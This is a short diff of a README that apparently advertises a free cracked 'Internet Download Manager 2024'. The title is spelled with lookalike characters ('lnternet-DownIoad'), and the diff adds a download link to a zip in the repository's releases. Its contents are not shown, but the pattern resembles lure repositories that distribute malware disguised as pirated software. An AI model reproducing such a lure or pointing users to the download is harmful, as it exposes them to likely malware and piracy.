@@ -1,6 +1,6 @@
 # 🚀 lnternet-DownIoad-Manager-2024-IDM-free
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/lluanlima/lnternet-DownIoad-Manager-2024-IDM-free/releases/download/lnternet-DownIoad-Manager-2024-IDM-free/lnternet-DownIoad-Manager-2024-IDM-free.zip)
 
 
 ## Key Functions:
